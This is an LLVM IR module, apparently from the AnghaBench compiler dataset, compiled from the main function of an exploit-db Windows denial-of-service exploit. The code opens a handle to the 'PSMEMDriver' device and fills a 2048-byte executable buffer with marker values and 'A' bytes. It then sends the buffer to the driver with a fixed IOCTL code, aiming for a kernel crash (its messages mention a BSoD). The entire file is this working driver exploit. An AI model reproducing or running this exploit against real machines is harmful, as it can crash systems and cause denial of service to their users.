; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_41945.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_41945.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [56 x i8] c"Trying the get the handle for the PSMEMDriver device.\0D\0A\00", align 1
@FileName = common dso_local global i32 0, align 4
@INVALID_HANDLE_VALUE = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [51 x i8] c"Can't get the device handle, no BSoD today. 0x%X\0D\0A\00", align 1
@MEM_COMMIT = common dso_local global i32 0, align 4
@MEM_RESERVE = common dso_local global i32 0, align 4
@PAGE_EXECUTE_READWRITE = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [26 x i8] c"VirtualAlloc() failed. \0D\0A\00", align 1
@.str.3 = private unnamed_addr constant [15 x i8] c"Cleaning up.\0D\0A\00", align 1
@MEM_RELEASE = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [22 x i8] c"Resources freed up.\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i64, align 8
  %3 = alloca i32*, align 8
  %4 = alloca i64, align 8
  %5 = alloca i32*, align 8
  %6 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i64 0, i64* %2, align 8
  store i32* null, i32** %3, align 8
  store i32* null, i32** %5, align 8
  store i32 2048, i32* %6, align 4
  %7 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str, i64 0, i64 0))
  %8 = load i32, i32* @FileName, align 4
  %9 = call i64 @GetDeviceHandle(i32 %8)
  store i64 %9, i64* %2, align 8
  %10 = load i64, i64* %2, align 8
  %11 = load i64, i64* @INVALID_HANDLE_VALUE, align 8
  %12 = icmp eq i64 %10, %11
  br i1 %12, label %13, label %16

13:                                               ; preds = %0
  %14 = call i32 (...) @GetLastError()
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.1, i64 0, i64 0), i32 %14)
  store i32 1, i32* %1, align 4
  br label %58

16:                                               ; preds = %0
  %17 = load i32, i32* %6, align 4
  %18 = load i32, i32* @MEM_COMMIT, align 4
  %19 = load i32, i32* @MEM_RESERVE, align 4
  %20 = or i32 %18, %19
  %21 = load i32, i32* @PAGE_EXECUTE_READWRITE, align 4
  %22 = call i32* @VirtualAlloc(i32* null, i32 %17, i32 %20, i32 %21)
  store i32* %22, i32** %3, align 8
  %23 = load i32*, i32** %3, align 8
  %24 = icmp eq i32* %23, null
  br i1 %24, label %25, label %27

25:                                               ; preds = %16
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.2, i64 0, i64 0))
  store i32 1, i32* %1, align 4
  br label %58

27:                                               ; preds = %16
  %28 = load i32*, i32** %3, align 8
  %29 = ptrtoint i32* %28 to i64
  %30 = inttoptr i64 %29 to i32*
  store i32* %30, i32** %5, align 8
  %31 = load i32*, i32** %5, align 8
  %32 = bitcast i32* %31 to i64*
  store i64 1412299035, i64* %32, align 8
  %33 = load i32*, i32** %3, align 8
  %34 = ptrtoint i32* %33 to i64
  %35 = add nsw i64 %34, 4
  %36 = inttoptr i64 %35 to i32*
  store i32* %36, i32** %5, align 8
  %37 = load i32*, i32** %5, align 8
  %38 = bitcast i32* %37 to i64*
  store i64 1111638594, i64* %38, align 8
  %39 = load i32*, i32** %3, align 8
  %40 = ptrtoint i32* %39 to i64
  %41 = add nsw i64 %40, 8
  %42 = inttoptr i64 %41 to i32*
  store i32* %42, i32** %5, align 8
  %43 = load i32*, i32** %5, align 8
  %44 = load i32, i32* %6, align 4
  %45 = sub nsw i32 %44, 8
  %46 = call i32 @RtlFillMemory(i32* %43, i32 %45, i32 65)
  %47 = load i64, i64* %2, align 8
  %48 = load i32*, i32** %3, align 8
  %49 = call i32 @DeviceIoControl(i64 %47, i32 -1284494280, i32* %48, i32* null, i32* null, i32* null, i64* %4, i32* null)
  %50 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.3, i64 0, i64 0))
  %51 = load i32*, i32** %3, align 8
  %52 = ptrtoint i32* %51 to i32
  %53 = load i32, i32* @MEM_RELEASE, align 4
  %54 = call i32 @VirtualFree(i32 %52, i32 8, i32 %53)
  %55 = load i64, i64* %2, align 8
  %56 = call i32 @CloseHandle(i64 %55)
  %57 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.4, i64 0, i64 0))
  store i32 0, i32* %1, align 4
  br label %58

58:                                               ; preds = %27, %25, %13
  %59 = load i32, i32* %1, align 4
  ret i32 %59
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @GetDeviceHandle(i32) #1

declare dso_local i32 @GetLastError(...) #1

declare dso_local i32* @VirtualAlloc(i32*, i32, i32, i32) #1

declare dso_local i32 @RtlFillMemory(i32*, i32, i32) #1

declare dso_local i32 @DeviceIoControl(i64, i32, i32*, i32*, i32*, i32*, i64*, i32*) #1

declare dso_local i32 @VirtualFree(i32, i32, i32) #1

declare dso_local i32 @CloseHandle(i64) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
